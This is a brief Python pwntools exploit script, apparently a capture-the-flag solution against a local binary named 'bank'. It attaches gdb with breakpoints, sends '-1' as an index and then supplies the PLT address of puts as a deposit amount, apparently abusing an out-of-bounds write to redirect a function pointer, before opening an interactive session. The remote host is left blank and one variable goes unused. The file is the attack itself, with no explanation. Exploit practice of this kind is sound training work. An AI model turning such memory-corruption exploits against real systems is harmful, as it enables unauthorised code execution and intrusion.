#!/usr/bin/python3

from pwn import *

exe = ELF('bank', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+53
                b*deposit+59
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
leak_addr = 0x00000000402008

sla(b"in: \n", b"-1")
sla(b"deposit: \n", str(exe.plt['puts']))

p.interactive()
